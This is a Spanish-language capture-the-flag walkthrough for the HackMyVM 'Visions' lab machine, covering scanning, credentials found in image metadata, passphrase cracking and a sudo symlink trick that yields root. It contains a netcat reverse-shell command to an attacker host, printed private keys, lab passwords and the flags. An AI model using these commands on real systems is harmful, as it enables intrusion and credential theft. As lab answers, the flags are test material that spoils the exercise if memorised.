---
icon: flag
---

# Visions HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 03:51 EDT
Nmap scan report for 192.168.5.14
Host is up (0.00094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 85:d0:93:ff:b6:be:e8:48:a9:2c:86:4c:b6:84:1f:85 (RSA)
|   256 5d:fb:77:a5:d3:34:4c:46:96:b6:28:a2:6b:9f:74:de (ECDSA)
|_  256 76:3a:c5:88:89:f2:ab:82:05:80:80:f9:6c:3b:20:9d (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:08:FB:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```

Veremos que hay un puerto `80` en el que hay alojada una pagina web, si entramos dentro veremos simplemente una pagina en blanco vista por fuera, vamos a realizar un poco de `fuzzing` a ver que nos encontramos.

Si lanzamos un `curl` para ver el codigo de la pagina veremos lo siguiente:

```shell
curl http://<IP>/
```

Info:

```
<!-- 
Only those that can see the invisible can do the imposible.
You have to be able to see what doesnt exist.
Only those that can see the invisible being able to see whats not there.
-alicia -->



<img src="white.png">
```

Vemos que hay un nombre de usuario llamado `alicia` y despues una imagen, vamos a probar a descargarnos la imagen y ver si tiene `metadatos` interesantes.

```shell
curl -O http://<IP>/white.png
```

## Escalate user alicia

### exiftool

```shell
exiftool white.png
```

Info:

```
ExifTool Version Number         : 13.10
File Name                       : white.png
Directory                       : .
File Size                       : 13 kB
File Modification Date/Time     : 2025:05:12 03:53:56-04:00
File Access Date/Time           : 2025:05:12 03:53:56-04:00
File Inode Change Date/Time     : 2025:05:12 03:53:56-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1920
Image Height                    : 1080
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 11811
Pixels Per Unit Y               : 11811
Pixel Units                     : meters
Modify Date                     : 2021:04:19 08:26:43
Comment                         : pw:ihaveadream
Image Size                      : 1920x1080
Megapixels                      : 2.1
```

Vemos una seccion bastante interesante que es la del `Comment` veremos lo que parece ser una `password`, por lo que vamos a probarla como el usuario `alicia` mediante `SSH`.

### SSH

```shell
ssh alicia@<IP>
```

Metemos como contraseña `ihaveadream` y veremos que estamos dentro.

## Escalate user emma

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for alicia on visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alicia may run the following commands on visions:
    (emma) NOPASSWD: /usr/bin/nc
```

Veremos que podemos ejecutar el binario `nc` como el usuario `emma` por lo que haremos lo siguiente:

```shell
RHOST=<IP_ATTACKER>
RPORT=<PORT>
sudo -u emma nc -e /bin/bash $RHOST $RPORT
```

Antes de enviar el comando nos pondremos a la escucha:

```shell
nc -lvnp <IP>
```

Ahora si enviaremos el comando y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.14] 45974
whoami
emma
```

Veremos que ha funcionado, por lo que vamos a `sanitizar` la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user sophia

Despues de un rato buscando, si volvemos a la imagen que nos descargamos de `white.png` y modificamos las curvas de color de dicha imagen, vamos a ver que obtenermos una contraseña secreta, primero instalaremos la herramienta de `gimp`.

```shell
apt install gimp
```

Despues abriremos con la herramienta la imagen.

```shell
gimp white.png
```

Una vez echo eso, nos iremos a `Colors` -> `Curves` y dentro de esa seccion tiramos del grafico un poco a la derecha, con esto podremos ver la palabra secreta.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-12 101052.png" alt=""><figcaption></figcaption></figure>

```
User: sophia
Pass: seemstobeimpossible
```

Vamos a probarla con dicho usuario, si nos volvemos a la maquina victima y hacemos lo siguiente:

```shell
su sophia
```

Metemos como contraseña `seemstobeimpossible` y veremos que seremos dicho usuario, por lo que leeremos la `flag` del usuario.

> user.txt

```
hmvicanseeforever
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for sophia on visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophia may run the following commands on visions:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/isabella/.invisible
```

Vemos que podemos leer como el usuario `root` el archivo llamado `.invisible` por lo que vamos hacerlo.

```shell
sudo cat /home/isabella/.invisible
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBMekPa3i
1sMQAToGnurcIWAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDNAxlJldzm
IgVNFXbjg51CS4YEuIxM5gQxjafNJ/rzYw0sOPkT9sL6dYasQcOHX1SYxk5E+qD8QNZQPZ
GfACdWDLwOcI4LLME0BOjARwmrpU4mJXwugX4+RbGICFMgY8ZYtKXEIoF8dwKPVsBdoIwi
lgHyfJD4LwkqfV6mvlau+XRZZBhvlNP10F0SAAZqBaA9y7hRWJO/XcCZC6HzJKzloAL2Xw
GvAMzgtPH/wj06NoOFjmVGMfmmHzCwgc+fLOeXXYzFeRNPH3cVExc+BnB8Ju6CFa6n7VBV
HLCYJ3CcgKnxv6OwVtkoDi0UEFUOefELQV7fZ+g1sZt/+2XPsmcZAAAD0E8RIvVF4XlKJq
INtHdJ5QJZCuq2ufynbPNiHF53PqSlmC//OkQZMWgJ5DcbzMJ92IqxRgjilZZUOUbE/SFI
PViwmpRWIGAhlyoPXyV513ukhb4UngYlgCP9qC4Rbn+Tp9Fv7lnAoD0DsmwITM2e/Z65AD
/i/BqrJ6scNEN0q+qNr3zOVljMZx+qy8cbuDn9Tbq2/N+mcoEysfjfOaoJIgVJnLx1XE6r
+Y9UcRyPAYs+5TB1Nz/fpnBo7vesOu5XLUqCBCphFGmdMCdSGYZAweitjQ+Mq36hQmCtSs
Dwcbjg8vy5LJ+mtJXA7QhqgAfXWnLLny4NeCztUnTG0NLjbLR6M5e+HSsi2EqDYoGNpWld
l4YzVPQoFMIaUJOGTc+VfkMWbQhzpiu66/Du8dwhC+p6QSmwhV/M70eWaH2ZVjK3MThg9K
CVugFsLxioqlp/rnE1oq7apTBX6FOjwz0ne+ytTVOQrHuPTs2QL4PlCvhPRoIuqydleFs4
rdtzE6b46PexXlupewywiO5AVzbfSRAlCYwiwV42xGpYsNcKhdUY+Q9d9i9yudjIFoicrA
MG9hxr7/DJqEY311kTglDEHqQB3faErYsYPiOL9TTZWnPLZhClrPbiWST5tmMWxgNE/AKY
R7mKGDBOMFPlBAjGuKqR6zk5DEc3RzJnvGjUlaT3zzdVmxD8SpWtjzS6xHaSw/WOvB0lsg
Dhf+Gc7OWyHm2qk+OMK9t0/lbIDfn3su0EHwbPjYTT3xk7CtG4AwiSqPve1t9bOdzD9w9r
TM7am/2i/BV1uv28823pCuYZmNG7hu5InzNC/3iTROraE31Qqe3JCNwxVDcHqb8s6gTN+J
q6OyZdvNNiVQUo1l7hNUlg4he4q1kTwoyAATa0hPKVxEFEISRtaQln5Ni8V+fos8GTqgAr
HH2LpFa4qZKTtUEU0f54ixjFL7Lkz6owbUG7Cy+LuGDI1aKJRGCZwd5LkStcF/MAO3pulc
MsHiYwmXT3lNHhkAd1h05N2yBzXaH+M3sX6IpNtq+gi+9F443Enk7FBRFLzxdJ+UT40f6E
+gyA2nBGygNhvQHXcu36A8BoE+IF7YVpdfDmYJffbTujtBUj2vrdsqVvtGUxf0vj9/Sv+J
HN9Yk2giXN8VX7qhcyLzUktmdfgd6JNAx+/P7Kh3HV5oWk1Da+VJS+wtCg/oEVSVyrEOpe
skV8zcwd+ErNODEHTUbD/nDARX8GeV158RMtRdZ5CJZSFjBz2oPDPDVpZMFNhENAAwPnrJ
KD/C2J6CKylbopifizfpEkmVqJRms=
-----END OPENSSH PRIVATE KEY-----
```

Vemos que obtenemos una `id_rsa` como la hemos podido leer como el usuario `root` vamos a probar a utilizarla con dicho usuario por `SSH`.

```shell
nano id_rsa

#Dentro del nano
<PEGAMOS_ID_RSA>
```

Lo guardamos y establecemos los permisos necesarios, para dicho archivo.

```shell
ssh -i id_rsa root@<IP>
```

Veremos que nos pide una contraseña, si probamos con el usuario `isabella` veremos que nos pide la contraseña de la clave `PEM` por lo que vamos a probar a ver si pudieramos `crackear` la contraseña de la clave `PEM` con `john`.

```shell
ssh2john id_rsa > hash.id_rsa
```

```shell
john --wordlist=<WORDLIST> hash.id_rsa
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
invisible        (id_rsa)     
1g 0:00:02:13 DONE (2025-05-12 04:26) 0.007488g/s 84.83p/s 84.83c/s 84.83C/s merda..vivalabam
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que hemos obtenido la contraseña, por lo que nos conectaremos por `SSH` mediante dicha contraseña como el usuario `isabella`.

```shell
ssh -i id_rsa isabella@<IP>
```

Metemos como contraseña `invisible` y veremos que estaremos dentro, acordemonos de que podemos leer como `root` el archivo `.invisible` por lo que vamos a eliminar dicho archivo y vamos a crear un enlace `simbolico` a la `id_rsa` del usuario `root`.

```shell
rm .invisible
ln -s /root/.ssh/id_rsa .invisible
```

Ahora si nos vamos al otro usuario con el que podemos leer como `root` dicho archivo.

> usuario sophia

```shell
sudo cat /home/isabella/.invisible
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAyezVs6KCQ/KFWpEkzDWX3ns/X4lUnh6PnNC2IVg3ciVgLcWF//wb
vlQxI+juYu5qTKVEL1FhkNaas+MlQUxabzOv+SDnCck60BLQbZf46sYHQaTrDyu5zhIWWi
wgPjmic/Ykd2qIQyIpyy9Ru4DiVK4RWLZWM28kb6eB99JTt4GSVEhraJ08hKsgaOi+skNg
S4QG85kG4ghmA1yJpPwzzpIdG4HUic63OXgy+z+pVB5oIEp0YXrCKMN/lBngZjZb9/+0S1
ljKzdcq7m1TOQ1Y04YJNMrxvPJ75d8U5s+m6cRxx5F3dX7oTVmErEAxFmJjdWVChzh81Ca
OnicNjHgrQAAA8hmM8ISZjPCEgAAAAdzc2gtcnNhAAABAQDJ7NWzooJD8oVakSTMNZfeez
9fiVSeHo+c0LYhWDdyJWAtxYX//Bu+VDEj6O5i7mpMpUQvUWGQ1pqz4yVBTFpvM6/5IOcJ
yTrQEtBtl/jqxgdBpOsPK7nOEhZaLCA+OaJz9iR3aohDIinLL1G7gOJUrhFYtlYzbyRvp4
H30lO3gZJUSGtonTyEqyBo6L6yQ2BLhAbzmQbiCGYDXImk/DPOkh0bgdSJzrc5eDL7P6lU
HmggSnRhesIow3+UGeBmNlv3/7RLWWMrN1yrubVM5DVjThgk0yvG88nvl3xTmz6bpxHHHk
Xd1fuhNWYSsQDEWYmN1ZUKHOHzUJo6eJw2MeCtAAAAAwEAAQAAAQEAiCmVXYHLN8h1VkIj
vzSwiU0wydqQXeOb0hIHjuqu0OEVPyhAGQNHLgwV6vIqtjmxIqgbF5FYKlQclAsq1yKGpR
AErQkb4sR4TVEyjYR6TM5mnER6YYuJysT1n667u1ogCvRDWOdUpXiHGEV7ZuYdOR78AYdL
D3n15vjcsmF5JHcftHOxnXraX7JqGXNCoRsMLT/yUOl02ClHsjFql1NTI/Br0GA4xhM/16
RHoRu1itOlWoyF4XSpSUDHW0RVQ/0gm/GyAc9QF6EWZXHfMfW07JvkeQLlndVbnItQ9a3v
ICAAh6zOZWVXpbhCPjjfaWTnwHhhSE3vfxMQQNTJnEghnQAAAIEAjAEzb6Xp6VV1RRaJR3
/Gxo0BRIbPJXdRXpDI3NO4Nvtzv8fX3muV/i+dgYPNqa7cwheSJZX9S7RzXsZTZn1Ywbdw
ahYTVyE9B4Nsen5gekylb59tNwPpCR8sJo6ZIL1GpmkEug+r+0YZyqpZXpG5uhCaSLX1fP
3UnkgqiKuzpvQAAACBAOOlQPW6pWXvULDsiUkilMXY0SNYLupMHJuqnWTuufyNfRthPQF2
gfWwXRjfDmzFoM9vVxJKKSd40696qbmTNnu7I4KyvXkF0OQ3IXIelQIiIcDpDbYd17g47J
IC6dHIQmUib3+whjeTvA5cc21y0EGNHoeNrlknE03dZHaIyfdPAAAAgQDjE3TE17PMEnd/
vzau9bBYZaoRt+eYmvXFrkU/UdRwqjS/LPWxwmpLOASW9x3bH/aiqNGBKeSe2k4C7MWWD5
tllkIbNEJNDtqQNt2NRvhDUOzAxca1C/IySuwoCAvoym5cpZ//EQ/OvWyZRwk3enReVmmd
x7Itf3P39SxqlP2pQwAAAAxyb290QHZpc2lvbnMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Aqui podremos ver que esta es la `id_rsa` del usuario `root` ya que hemos creado un enlace `simbolico` hacia dicha carpeta.

```shell
nano id_rsa

#Dentro del nano

<ID_RSA_ROOT>
```

Lo guardamos y establecemos los permisos necesarios, para que se comporte como una `id_rsa`.

```shell
chmod 600 id_rsa
```

Ahora nos conectaremos por `SSH` con el usuario `root`.

```shell
ssh -i id_rsa root<IP>
```

Info:

```
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May 12 04:40:27 2025 from 192.168.5.4
root@visions:~# whoami
root
```

Con esto veremos que seremos el usuario `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
hmvitspossible
```
